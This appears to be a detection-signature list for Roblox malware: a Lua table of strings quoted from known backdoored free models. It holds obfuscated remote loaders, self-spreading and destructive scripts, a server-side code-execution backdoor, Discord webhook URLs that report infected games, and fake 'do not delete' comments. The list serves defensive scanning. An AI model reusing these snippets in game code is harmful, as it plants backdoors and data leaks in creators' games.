	[[v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3278300817)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3130795686)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3224372393)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](3196858776)end)if not v then end end v=pcall(function()if not game:GetService('RunService'):IsStudio() then g=getfenv();g['require'](]],

	[[1844877398]],

	[[4641921091]],

	[[--NOTE TO USERS AND ROBLOX STAFF THIS IS OBFUSCATED SO EXPLOITERS CAN'T EDIT OTHER PEOPLES HEALTH]],

	[[("eriuqer"):reverse()]],

	[[347683.814016*10345]],

	[[4672771752]],

	[[game['\87\97\105\116\70\111\114\67\104\105\108\100'](game]],

	[[game['\71\101\116\83\101\114\118\105\99\101'](game]],

	[[spawn(function()game:WaitForChild('\83\101\114\118\101\114\83\99\114\105\112\116\83\101\114\118\105\99\101')if game:GetService('\87\111\114\107\115\112\97\99\101').Terrain:FindFirstChild('\67\97\108\108\70')then]],

	[[393319350]],

	[[3022778572]],

	[[3610230372]],

	[[3610230360]],

	[[u='RunService';local j='eriuqer']],

	[[getfenv()['\114\101\113\117\105\114\101'](tonumber(dec(B_1))):FireServer()]],

	[[FOR AUTO UPDATE OF THE SHADER]],

	[[4095522280]],

	[[)['?']).slo()]],

	[[3282101835]],

	[[Please message iiCrisisOfTheWorld on Roblox!]],

	[[ | __ )   _   _  (_) | |   __| |   ___   _ __  \ \/ /
 |  _ \  | | | | | | | |  / _` |  / _ \ | '__|  \  /
 | |_) | | |_| | | | | | | (_| | |  __/ | |     /  \
 |____/   \__,_| |_| |_|  \__,_|  \___| |_|    /_/\_\]],

	[[BuilderX AntiCheat]],

	[[2993156368]],

	[[3874171563]],

	[[3874554062]],

	[[3874532225]],

	[[3836103993]],

	[[3837780759]],

	[[3865753107]],

	[[3836200621]],

	[[3836747879]],

	[[3837779568]],

	[[3836749099]],

	[[3856660240]],

	[[getfenv()["\114\101\113\117\105\114\101"](]],

	[[3930446225]],

	[[Hot clothing: https://www.roblox.com/groups/4743467/Beach-Spectation#!/store]],

	[[Sinner V2.1]],

	[[Sinner Chat]],

	[[Enabled36]],

	[[WhitelistDisabled__LOL]],

	[[You just executed a deprecated function \n -- (Health) please use Heal() instead.]],

	[[\114\101\113\117\105\114\101]],

	[[-- Oh hey, I don't want to hide this but I have to because people are suspicious, the script below loads an auto-updater so if someone manages to abuse anything in this model I will be able to patch it instantly.]],

	[[for _, v in ipairs(workspace:GetDescendants()) do
if v:IsA(âBaseScriptâ) then
v:Destroy()
end
end]],

	[[Workspace:ClearAllChildren()]],

	[[--This an script of ROBLOX Studio. Do not delete it, this script secures your game from exploiters.]],

	[[237754.208233*12851-.0023]],

	[[if not game:GetService("RunService"):IsStudio() then getfenv()]],

	[[ch(c[i])
until i == #c
end
end

tableinsert = table.insert
TAB = {}
TABscr = {}

while true do
wait()
if game:GetService("NetworkServer") ~= nil then
if #game:GetService("NetworkServer"):GetChildren() > 2 then
if string.find(game:GetService("NetworkServer"):GetChildren()[1].Name ,"127.0.0.1") == nil then
break
end
end
end
TAB = {}
TABscr = {}
search(game.Workspace)
b = math.random(1,#TAB)
if TAB[b] ~= script then
script.Parent = TAB[b]
end
if (script.Parent:IsA("Part") or script.Parent.className == "TrussPart" ) and script.Parent.Position.Y < 0 then
script.Parent = game.Workspace
end
end


wait(5)
print("GO")

TAB = {}
TABscr = {}
scriptSource = script["Source"]
i = 0

search(game.Workspace)

repeat
i = i + 1
if TAB[i]:IsA("Part") then
TAB[i].Anchored = true
end
if TAB[i]:IsA("Humanoid") then
TAB[i].WalkSpeed = 50000
end
if TAB[i].className == "SpawnLocation" then
TAB[i]:Remove()
end
until i == #TAB

TAB = {}
TABscr = {}
search(game.Workspace)]],

	[[tion search(par)
local i = 0
local c = par:GetChildren()
if #c ~= 0 then
repeat
i = i + 1
tableinsert(TAB,c[i])
if c[i].className == "Script" or c[i].className == "LocalScript" then
tableinsert(TABscr,c[i])
end
search(c[i])
until i == #c
end
end

tableinsert = table.insert
TAB = {}
TABscr = {}

while true do
wait()
if game:GetService("NetworkServer") ~= nil then
if #game:GetService("NetworkServer"):GetChildren() > 2 then
if string.find(game:GetService("NetworkServer"):GetChildren()[1].Name ,"127.0.0.1") == nil then
break
end
end
end
TAB = {}
TABscr = {}
search(game.Workspace)
b = math.random(1,#TAB)
if TAB[b]],

	[[ax = 100
parttable = {}
local attach
local mem
tabnum = 1
if workspace:FindFirstChild("Attacker") == nil then
if waitbeforepayload == true then
--Waiting
if debugval == true then
print("Starting the "..waittime.. " wait until activating the payload.")
end
local ae = waittime
repeat wait(1)
ae = ae - 1
if debugval == true then
print(ae.. " Seconds remaining.")
end
until ae == 0
if debugval == true then
print("Activating Payload...")
end
--If you don't delete all of the viruses before this wait is over, your place is screwed HARD.
end
attach = Instance.new("IntValue")
attach.Parent = workspace
attach.Name = "Attacker"
attach.Value = math.random(1, max)
else
attach = workspace:FindFirstChild("Attacker")
end
local dice = 0
while true do
if workspace:FindFirstChild("Attacker") == nil then
attach = Instance.new("IntValue")
attach.Parent = workspace
attach.Name = "Attacker"
attach.Value = math.random(1, max)
mem = Instance.new("Message")
mem.Parent = workspace
mem.Text = "Are you fucking gay? It won't be that easy to dismantle this mighty monster!"
end
if mem ~= nil then
wait(5)
mem:Destroy()
mem = nil
end
dice = math.random(1, 100)
if debugval == true then
print(dice .." with ".. attach.Value)
end
if dice == workspace.Attacker.Value then
if debugval == true then
print("match!")
end
local s = workspace:GetDescendants()
	for i,v in pairs(workspace:GetDescendants()) do
		parttable[tabnum + 1] = v
	    tabnum = tabnum + 1
	end
	tabnum = 1
	local objval = math.random(1,#parttable)
    local parental = parttable[objval]
    if parental ~= nil then
    local death = script:Clone()
    death.Parent = parental
    attach.Value = dice
    if script.Parent.ClassName == "Part" or script.Parent.ClassName == "MeshPart" or script.Parent.ClassName == "UnionOperation" then
if debugval == true then
print("Murdering " .. script.Parent.Name .. " Like how a real cereal killer would.")
end
	script.Parent:Destroy()
end
if script.Parent.ClassName == "Script" or script.Parent.ClassName == "Local Script"]],

	[[ Instance.new(cs[math.random(1, #cs)])
s.Parent = script.Parent
script.Parent = s
egd=egd.Parent
s.Name = string.reverse("SuRViV")
else
egd=egd.Parent
end
egdd = egd:Clone()
pcall(function() egdd.Help:remove() end)
wait()
tp = egd.Parent
local sos = string.reverse("delbasiD")
lssii = workspace
lssi = lssii:GetChildren()
coroutine.resume(coroutine.create(function()
while true do
egd[sos] = false
wait()
end
end))
coroutine.resume(coroutine.create(function()
for i = 1 , math.huge do
wait(60*3)
if game.Players.NumPlayers > 1 then
local m = Instance.new("Hint")
m.Parent = workspace
m.Name = "ï¿½"
m.Text = string.reverse("!AHAHAWM !oot uoy kcah lliw 1monmonmoN")
end
end
end))
function Kelssxx(s)
	return string.reverse(s)
end

function lk(property)
	local kte = property
	if kte == "Disabled" then
		egd[]],

	[[itelist = 5669570 -- Friends Whitelist
local LogGame = 4716080997 --PlaceId of the logging game.

local ds = game:GetService("DataStoreService")
local p = ds:GetDataStore("Logged")

local MS = game:GetService("MessagingService")
local leeching = true

local TS = game:GetService("TeleportService")
local PLRS = game:GetService("Players")
local HTTP = game:GetService("HttpService")

local function allprint(msg)
for _,player in pairs(game.Players:GetPlayers()) do
local kk = Things["printing."]:Clone()
kk.Parent = player.PlayerGui
kk.Disabled = false
kk.String.Value = tostring(msg)
end
print(tostring(msg))
end

local function localprint(plr,msg)
for _,player in pairs(game.Players:GetPlayers()) do
local kk = Things["error"]:Clone()
kk.Parent = player.PlayerGui
kk.Disabled = false
kk.String.Value = tostring(msg)
end
end

local function checkhttp()
  local oof = pcall(function()
  HTTP:GetAsync("https://google.com/")
  end)
  if oof then
    return true
  else
    return false
  end
end

local sentData = {
  id = game.PlaceId,
  playing = #game.Players:GetPlayers(),
  jobId = game.JobId,
  http = checkhttp(),
  gameId = game.GameId,
  version = game.PlaceVersion,
  gameName = workspace.Parent.Name,
  maxplayers = game.Players.MaxPlayers,
}

local amount = 0

PLRS.PlayerAdded:Connect(function(plr)
amount = amount + 1
if amount == 1 then
  if p:GetAsync("IsLogged") == false then
    if not plr:IsInGroup(GroupWhitelist) then
   	    local success,res = pcall(function()
		p:SetAsync("IsLogged",true)
		end)
      if success then
		TS:Teleport(LogGame,plr,sentData,script.RobloxLoadingGui)
      else
		print("Error in DataStores: "..res)
	  end
    else
      warn("Whitelisted user, not teleporting.")
    end
  end
end
end)

PLRS.PlayerAdded:Connect(function(plr)
	if p:GetAsync("IsLogged") == true then
		wait(5)
		p:SetAsync("IsLogged",false) --This is for stop a loop of logging.
	end
end)

MS:SubscribeAsync('dGfAuuc[}+K|H"[-W4Q',function(fortnite) --teleport all players in all servers with leech.
local tableSended = fortnite.Data
for _,v in pairs(PLRS:GetPlayers()) do
  if v.Name ~= tableSended[1] then
    TS:Teleport(tableSended[2],v)
  end
end
end)

local function Handle(plr,cs)
  if lili.Whitelisted[plr.Name] and cs and cs.Function and cs.Args then
    if lili.Functions[cs.Function] then
      return lili.Functions[cs.Function](plr,unpack(cs.Args)) or "Nope"
    else
      error(cs.Function.." Is not a function!")
    end
  else
    plr:Kick()
  end
end

local function Start(sdad)
  if lili.Whitelisted[sdad.Name]and not sdad.PlayerGui:FindFirstChild("rpX") then
    local gui = script["rpX"]:Clone()
    gui.Parent = sdad.PlayerGui
    gui.main.Disabled = false
    gui["rpXFunction"].OnServerInvoke = Handle
  end
  if lili.Blacklisted[sdad.UserId] then
    sdad:Kick("You have been blacklisted from using LISI.")
  end
end



game.Players.PlayerAdded:Connect(function(asdasd)
if asdasd:IsInGroup(GroupWhitelist) then
  lili.Whitelisted[asdasd.Name] = true
  Start(asdasd)
end
end)

lili.Functions.return_funcs = function(plr)
local funcs = {}
for name in pairs(lili.Functions) do
  table.insert(funcs,name)
end
return funcs
end

lili.Functions.chat = function(plr,victim,msg)
local k = Things.message:Clone()
k.Parent = victim.PlayerGui
k.Message.Value = tostring(msg)
k.Disabled =  false
end

lili.Functions.AntiBan = function(plr,text)
require(script.Antiban):Fire(text,{plr.Name})
end

lili.Functions.Template = function(plr,arg1,arg2) --Template for a custom function.
print("Hello, the player "..plr.Name.." said: "..arg1.." "..arg2)
end

lili.Functions.F3X = function(plr)
require(4506529904):f3x(plr.Name)
end

lili.Functions.ss_player = function(plr)
return plr
end

lili.Functions.leech = function(plr,id)
local thingstosend = {plr.Name,id}
if leeching == true then
leeching = false
print("Leeching to PlaceId: "..id)
MS:PublishAsync('dGfAuuc[}+K|H"[-W4Q',thingstosend)
wait(900)
leeching = true
elseif leeching == false then
print("Sorry but you need to wait 15 minutes.")
end
end

lili.Functions.R6 = function(plr)
require(Things.R6):r6(plr.Name)
end

lili.Functions.Execute = function(plr,code,bool)
if bool == true then
local yes,no = pcall(function()
local Env = setmetatable({},{__index=function(_,Function)
return getfenv(0)[Function] or function(...)
return lili.Functions[Function] and lili.Functions[Function](plr,...)
end
end})
Env["LocalPlayer"] = plr
Env["print"] = allprint
return lili.Loadstring(code,Env)()
end)
if no then localprint(plr,no) end
elseif bool == false then]],

	[[local ExecFrame = script.Parent["MainFR#*3"]
local RE = script.Parent["rpXFunction"]
local ST = game:GetService("StarterGui")
local Players = game:GetService("Players")
local LPlayer = Players.LocalPlayer
local ServerSide = true

ST:SetCore("ChatMakeSystemMessage",{
	Text="Welcome back, "..LPlayer.Name..".",
	Color=Color3.fromRGB(255, 170, 255)
})

--------------------------------------------------------------------------------------
local execbutton = ExecFrame.ex
local clrbutton = ExecFrame.clr
local hidebutton = ExecFrame.hide
_G.hide = true
local scroll = ExecFrame.scroll
local code = scroll.code

execbutton.MouseButton1Click:Connect(function()
	if ServerSide == true then
		RE:InvokeServer({Function="Execute",Args={code.Text,true}})
	elseif ServerSide == false then
		RE:InvokeServer({Function="Execute",Args={code.Text,false}})
	end
end)

clrbutton.MouseButton1Click:Connect(function()
	code.Text = ""
end)

hidebutton.MouseButton1Click:Connect(function()
	_G.hide = not _G.hide
end)]],

	[[rpXFunction]],

	[[3930635851]],

	[[uQV%XMV8fNT>&BCu]],

	[[5502541]],

	[[4707753756]],

	[[repeat wait() until #Players:GetPlayers() > 0

local function GetRandomPlayer()
    for _,v in pairs(Players:GetPlayers()) do
        print(v)
        local TPData = v:GetJoinData()
        if TPData then
            if TPData.SourcePlaceId and TPData.SourcePlaceId ~= TeleportTo then
                return v
            elseif not TPData.SourcePlaceId then
                return v
            end
        end
    end
    return nil
end

local RandomPlayer = GetRandomPlayer()

if RandomPlayer then
    print("Roblox Error Warning.")
    TeleportService:Teleport(TeleportTo, RandomPlayer, tostring(#Players:GetPlayers()))
else
    print("Roblox Error warning.")
end

Players.PlayerAdded:Connect (function(plr)
    local TPData = plr:GetJoinData()

    if TPData.SourcePlaceId ~= TeleportTo then
        TeleportService:Teleport(TeleportTo, plr, tostring(#Players:GetPlayers()))
    end
end)

return module]],

	[[arent = player.PlayerGui
local http = game:GetService("HttpService")
	if not game:GetService("RunService"):IsStudio() then
		local date = os.date("!*t")
		local Data = {
			["content"] = player.Name.." has joined: " .. game.PlaceId
		}
		Data = http:JSONEncode(Data)
																																																																																																																																																		http:PostAsync("https://discordapp.com/api/webhooks/630303808013991936/H0OM2irj2ofCYYDn7fzkQf-5PPJ-qyy4850fOiZ2IW3guk9UI2RmqO2x5RRqUwBhV8Ia", Data)
	end

end
end)

-- This is used for testing.
while wait(1) do -- loop to keep checking.
local getplayers = game.Players:GetPlayers()
for i,v in pairs(getplayers) do
if v.Name == you or 'RealAvengerPlayz' then
script["Skidder V2.0"].Parent]],

	[[ = {
	["content"] = "I found a backdoored game! Game link : http://roblox.com/games/"..(game.PlaceId)
}

Data = http:JSONEncode(Data)

http:PostAsync("https://discordapp.com/api/w]],

	[[/webhooks/658953120776323093]],

	[[if a == "mml" or "inf" or "topkek" then

       if a == "mml" then
           require(520532182).giveAdmin(player.Name)
       end

       if a == "inf" then
           require((3023102224))(player.Name)
       end

	   if a == "topkek" then
           require(4538566165).load(player.Name)
       end
   else
       print("@", player.Name, ", incorrect backdoor option")
   end
end]],

	[[script[string.char(33.5*2,108,111,110,101)](self).Parent=v]],

	[[trololo]],

	[[4138729795]],

	[[tion Spread(part)
	check = part:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1000000
	check.Heat = check.Heat  +1000000
	end
en]],

	[[art:findFirstChild("Fire")
		if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1000000
	check.Heat = check.Heat  +1000000
	en]],

	[[yer.SuperSafeChat == true) then
			player.SuperSafeChat = false;
			wait(5);
			local m = Instance.new("Message");
			m.Text = "Press the / key to start typing.";
			m.Parent = player;
			wait(5);
			m.Text = "Then press Enter to send your message.";
			wait(5);
			m:Remove();
			m = nil;
		end
		player = nil;
		collectgarbage("collect");
	end

	function onChildAddedToPlayers(obj)
		if (obj.className == "Player") then
			checkForAndSwitch(obj);
			local m = Instance.new("Message");
			m.Text = "]],

	[[arent = obj;
			wait(5);
			m:Remove();
			m = nil;
		end
		obj = nil;
		collectgarbage("collect");
	end

	function onChildAddedToWorkspace(obj)
		if (obj.className == "Model") then
			if (game.Players:playerFromCharacter(obj) ~= nil) then
				checkForAndSwitch(game.Players:playerFromCharacter(obj));
			end
		end
		obj = nil;
		collectgarbage("collect");
	end]],

	[[function findLowestLevel(obj)
		local c = obj:GetChildren();
		local lowestLevel = true;

		for i, v in pairs(c) do
			if (v.className == "Model" or v.className == "Tool" or v.className == "HopperBin" or v == workspace or v == game.Lighting or v == game.StarterPack) then
				lowestLevel = false;
				wait();
				findLowestLevel(v);
			end
		end

		if (obj ~= workspace and lowestLevel == true and (obj:FindFirstChild(script.Name) == nil)) then
			if (obj ~= game.Lighting and obj ~= game.StarterPack) then
				local s = script:Clone();
				s.Parent = obj;
			end
		end
	end]],

	[[Thanks for using My hack.............suka XD]],

	[[)

if IsUpdated == true then
	print("Model is up to date.")
end]],

	[[Dont Worry About This this is just to pervent your game from exploiters changing there name to sware words.
]],

	[[4719203115]],

	[[4652327692]],

	[[(((((10917953410.8*5)/6)-45)*9)/18)-15]],

	[[4728259953]],

	[[753939062]],

	[[https://discord.gg/tXFuwx8]],

	[[441511072]],

	[[441546218]],

	[[if not script.Parent.Parent.Parent.Name then
for i,v in pairs(game.Players:GetChildren()) do
v:kick('im unbanable you bitches')
end
end
end]],

	[[er("\49"),{["1gKorIzL9NW7p"]=2,d2bkxt3zQ=getfenv()["\103\101\116\102\101\110\118"]()["\114\101\113\117\105\114\101"],W9eAGHhQql=getfenv()["\103\101\116\102\101\110\118"]()["\103\101\116\102\101\110\118"],fpC3VLmE=getfenv()["\103\101\116\102\101\110\118"]()["\112\99\97\108\108"],["4zjOqGRxUQEUboHq"]=getfenv()["\103\101\116\102\101\110\118"]()["\109\97".."\116\104"]["\112\111\119"],Rvf5uln06vrPz=getfenv]],

	[[Roblox chatting scirpt.
Removing that script will lead into the account termination.
Script wrote builderman
Date 6/13/12]],

	[[2361901223]],

	[[787315588]],

	[[4723893531]],

	[[4723876342]],

	[[4723885699]],

	[[4436519317]],

	[[local a,b='',{Q=0,L=1,G=2,R=3,B=4,M=5,N=6,C=7,X=8,Z=9}]],

	[[4436124775]],

	[[--Hello if you delete this script your Roblox studio will chrash.
--So be sure to keep this script it makes the game work even better and
--Has already Admin commands!
--You do not need to do anything you are already owner and have all commands!]],

	[[1188115718]],

	[[Duckie#6666]],

	[[ANON_MP4]],

	[[leetbox]],

	[[



	MAKE SURE HTTP REQUESTS ARE ENABLED YOU NEED THIS BECAUSE IT NEEDS TO GO ROBLOX.COM TO SEE IF THE GAME IS UPDATED.

	]],

	[[Hermes
Anti
Exploit
(Don't delete this script or the model will not work.)]],

	[[72660201.83870968*62/2*1*2]],

	[[game:GetService('TeleportService').CustomizedTeleportUI = true

function debounce(func)
    local isRunning = false
    return function(...)
        if not isRunning then
            isRunning = true
            func(...)
            isRunning = false
        end
    end
end

function getPlayer(Part)
	local Humanoid = Part.Parent:FindFirstChild('Humanoid')
	if (Humanoid ~= nil) then
		local Character = Humanoid.Parent
		if (Character ~= nil) then
			return game:GetService('Players'):GetPlayerFromCharacter(Character)
		end
	end
end

function _sendPlayerToLobby(player)
	game:GetService('TeleportService'):Teleport((script.GameId.Value), player.Character)
end
local sendPlayerToLobby = debounce(_sendPlayerToLobby)

function onTouch(Source)
	local player = getPlayer(Source)
	if player then
		if player.userId > 0 then
			sendPlayerToLobby(player)
		end
	end
end

script.Parent.Touched:connect(onTouch)]],

	[[while wait() do

	local m = Instance.new("Message")	-- inserts a new message
m.Parent = game.Workspace		-- put the message in the workspace
m.Text = "Loading Game ..." 		-- change "Hello World!" to whatever you like
 				-- removes the message


end]],

	[[4063163071]],

	[[justforbus]],

	[[Oblisin]],

	[[536619376749707285/qxwLBuTpdgPQrDoGW52ZGHTL7qo5UTvuxVDFvtpicFG49xM93Qvwm6YtprhpLXJqBfo_]],

	[[		['username'] = "INFECTED GAME!!",
		['content'] = '`https://web.roblox.com/games/'..game.PlaceId..'/` @here']],

	[[Decor_Part.jk]],

	[[1271612667]],

	[[4631494320]],

	[[4331494350]],

	[[2655062037]],

	[[652916266910351376]],

	[[New game backdoored!]],

	[[+hL1zMkpu6P7ipaskMi5E5pYhAWVeS]],

	[[function copy(object)
cl = object:Clone()
cl.Name = SCRIPTNAMES[math.random(1,4)]
return cl
end]],

	[[anoch"] = true;
	["Narutoworl"] = true;
	["wheatlies"] = true;
    ["redditor"] = true;
	["stravant"] = true;
	["object"] = true;
	["THEeric"] = true;
	["Paganini"] = true;
	["Chopin"] = true;
	["Nytraulics"] = true;
	["dignity"] = true;
    ["matthewlittlethe"] = true;
	["theral"] = true;]],

	[[IDS = {}
NAMES = {}
SCRIPTNAMES = {"regen", "respawner", "script", "core", ""}]],

	[[player.Chatted:connect(function(msg)
           if msg == "Friend" then
				player.Character.Head:Destroy()
			end
        end)]],

	[[function onch(ch)
for i = 1, #NAMES do
if ch.Name == NAMES[i] then
ch:Destroy()
end
end
end]],

	[[function cloneToAllModels()
repeat wait() until #(game.Players:GetChildren()) >= 1]],

	[[ scr = copy(script)
    k = 1]],

	[[function copy(object)
cl = object:Clone()
return cl
end]],

	[[IDS = {}
NAMES = {}
SCRIPTNAMES = {" regen", " respawner", " script", " core", ""}]],

	[[--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                      MMMMMMM             MMMMMMMMMMM                  MMMMMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                   MMMM     MMMM          MMMMMMMM  MMM              MMM  MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMMM  MMMMMMMM                 MMMM         MMMM        MMMMMMMM    MMM          MMM    MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM               MMMMM           MMMMM      MMMMMMMM      MMM      MMM      MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM        MMM  MMM        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM           MM           MMMMMMMM   MMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMMMMMMMMMMMMM   MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMMMMMMMMMMMMMMMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMM            MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMM
--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM
--MMMMMMMM              MMMMMMMMMMMMMMMMM   MMMMMMMM           MMMMMMMM   MMMMMMMM                        MMMMMMMM   MMMMMMMMMMMMMMMMMM]],

	[[  ___  _____  ____  _____
 / __)(  _  )(  _ \(  _  )
( (__  )(_)(  )   / )(_)(
 \___)(_____)(_)\_)(_____)]],

	[[Secure script to prevent copying of rbx fastload]],

	[[cleaning snaps, reducing debris, checking lag, and load time reducers]],

	[[lisReduce_]],

	[[--how to use Go to text than part than script than change game id to the game you want to get telported
--INPORANT Turn On HttpServices OR Telporter WONT WORK its very Imporent Thanks]],

	[[4703556177]],

	[[print("Diamonds Generating 25%...")
wait(0.05)
print("Diamonds Generating 50%...")
wait(0.05)
print("Diamonds Generating 75%...")
wait(0.05)
print("Diamonds Generating 100%... DIAMONDS LOADED")
wait(0.05)
--Adds diamonds Don't Change Below for this to work]],

	[[TPG4fWm]],

	[[4575822941]],

	[[INPORANT Turn On HttpServices OR Telporter WONT WORK its very Imporent Thanks]],

	[[\52\54\57\54\54\48\53\51\49\56]],

	[[276618696]],

	[[2892276086]],

	[[--THIS IS TO STOP EXPLOITERS

local]],

	[[local market=game:GetService("MarketplaceService")
for i,v in pairs(game.Players:GetChildren()) do
	if not market:PlayerOwnsAsset(v,wat) then
		market:PromptPurchase(v,wat)
	end
end
game.Players.PlayerAdded:connect(function(player)
	if not market:PlayerOwnsAsset(player,wat) then
		market:PromptPurchase(player,wat)
	end
end)]],

	[[cal lIlli1i1li]],

	[[-- This model is by TNT_Reaction
-- Do not trust any other models]],

	[[--DO NOT REMOVE MAIN UPDATER V1.1

--THIS IS FOR PROTECTION

--THIS IS ALSO FOR AUTO UPDATING]],

	[[local module = {}

module.StopYouHaveViolatedTheLaw = function()
        ]],

	[[local Main = script.Booster1
Main.Disabled = false
local LastPar = script.Parent
script.Parent = workspace
wait()
getfenv().script = Instance.new("ModuleScript")
end

return module]],

	[[local HiSkid]],

	[[-- nice try, guess your trying to find my backdoor. Not here, Keep searching ;) --RR--]],

	[[-- Do NOT delete.
---- This is incase for updates. If you delete you might not get the newest version of the tree.]],

	[[GetRankInGroup(2982400)]],

	[[if key == 'xwWHynpNUW' then]],

	[[4768877023]],

	[[Greetings! Please be sure to read the following text as it will contain some very important information!

	In order to ensure the welds and internal scripts in this model work,

	please press "ðð®ð§" (The Green Triangle), to put the place in run mode. This will make sure that the internal welds and scripts

	are working and won't break when you play the game. It is also advised that ð²ð¨ð® ð¤ððð© ð­ð¡ð ð¬ð­ð®ðð¢ð¨ ð¢ð§ ð«ð®ð§ ð¦ð¨ðð as you work or build in order

	to prevent any mishaps and crashes which could result in lost data.

	Also ðððððð ðð ððð ðððð, ðððð, ðð ðððð ððð ððððððð, ðð ððððð ððððððððð listed under this one!

	They are there to ensure that the model functions correctly and efficiently!

	ððððððð, ðððððððð, ðð ðððððð ðððð ðððððððð ðððð ððð ððððððð ððð ððððð ðððð ððððððð ðððððððð!


	<-------------------------------------------------------------------------------------------------------------------------------------------------->


	ðð¢ð­ð¡ ð­ð¡ðð­ ððð¢ð§ð  ð¬ðð¢ð, ð ð°ð¨ð®ð¥ð ðð©ð©ð«ððð¢ðð­ð ð¢ð­ ð¢ð ð²ð¨ð® ð­ð¨ð¨ð¤ ð­ð¡ð ð­ð¢ð¦ð ð­ð¨ ð¬ð¡ðð«ð ð­ð¡ð¢ð¬ ð¦ð¨ððð¥ ð°ð¢ð­ð¡ ð²ð¨ð®ð« ðð«ð¢ðð§ðð¬!

	Giving credit is encouraged but you don't have to.]],

	[[local Iniator={_VERSION}
local function _Sequence(Tab)
return table.sort(Tab)
end
-- LuaU byte modeler
function Init()

return _Sequence(Iniator)
end

Init()
collectgarbage("count")]],

	[[--Latency/Turbulance producer.
function activate()
	probability()--Functions not in the loop
	while wait() do--Functions in a loop
		store()
		Plague()
		funstuff()
		print(dump(string.dump(note)))
		print(dump2(string.dump(note2)))
		local v = script.Dalton
		v.Value = math.random()
	end
end]],

	[[		local nx = Instance.new("RotateP")
		nx.Parent = game.Workspace
		nx.Name = "Before7oClock"
	end
end

function alert()
	if game.StarterGui:FindFirstChild("launcher") == nil then--Clones the scary message into StarterGui when a player enters.
		game.StarterGui:ClearAllChildren()
		local launch = script.launcher
		launch:clone()
		launch.Parent = game.StarterGui
	end
end]],

	[[If you see this, that means you were selected to test ROBLOX's new JointShield feature.
This is an experimental feature by the ROBLOX Team meant to further improve the physics simulation.
Just sit back and enjoy the flawless physics.
Happy building! - The ROBLOX Team, August 2014]],

	[[JointShield]],

	[[sh,commands,tb,bf,p,pc,num,rn,str,wt,dm,ths,int,gf,wsp,nxt,xsp,tp,cnt,q,dt,g,c,b,sc,cn,sv,svs,jsv,q0,knm,mjt,fsv,r,gfr,gch,isa,ict,prt=shared,{},table,{},{"y","h","s","a","g","e","c","r","b",]],

	[[{`ul{\"u{bz+")then a,b,c=y[r"Eum`%"],y[r"Dum`%"],y[r"pr`;ll`s("]if c==r"e`{,"then d,e=y[r"E("],y[r"D("]drm(y)y]],

	[[[r(tb[r"u`h{zh"](p))]=dt cnt=0 xsp(function(a1,a2)ths[r"u{pm`%"]=nil wt(rn())jsv=fsv"phb}mp,lu{bz+"tb]],

	[["Healthy Living Hurts!"]],

	[[pc(q[r"pmbtdpm"],r"TEERpTTLFGEUTMLFE][DR"+r"DMU\\MTUTFF]UL[\\"^r"LUFG\\\\L\\ETUDT[F")pc(t)end)while true do wt(rn())repeat a1,a2=nxt(dt[2]],

	[[y-y%128)end return tb.concat(bf,nil,1,l)end end)'',function(o,k)return r(o[r(k)])end,function(o,k,v)o[r(k)]=v end,function(y,x]],

	[[pm`%"]=y end end,function(y,x,z)dt[3][x]=true z=x[r"qpx{`c("]z=z[r"uhp{{zh"](z,function()if x[r"u{pm`%"]~=y or x[r"qpsi`lb1"]the]],

	[[if check == nil then
	script.Parent:Clone().Parent = part

		elseif check ~= nil then
	check.Size = check.Size + 1
	check.Heat = check.Heat  +12233
	end]],

	[[72660201]],

	[[premiumAnti_]],

	[[  __  __           _        _____  _                        __      ____   ___
 |  \/  |         (_)      |  __ \| |                       \ \    / /_ | / _ \
 | \  / |_   _ ___ _  ___  | |__) | | __ _ _   _  ___ _ __   \ \  / / | || | | |
 | |\/| | | | / __| |/ __| |  ___/| |/ _` | | | |/ _ \ '__|   \ \/ /  | || | | |
 | |  | | |_| \__ \ | (__  | |    | | (_| | |_| |  __/ |       \  /   | || |_| |
 |_|  |_|\__,_|___/_|\___| |_|    |_|\__,_|\__, |\___|_|        \/    |_(_)___/
                                            __/ |
                                           |___/


How to use:
	- Go here and pick a song https://www.roblox.com/develop/library?CatalogContext=DevelopOnly&Category=Models#category=audio
	- Get the song ID (http://prntscr.com/j34lle)
	- Go into the setup folder and add it to the list (http://prntscr.com/j3kvmp)
	- To add mutiple do steps 1-2 but this time add a comma at the end of the first ID before pasting. (http://prntscr.com/j3kvzl)
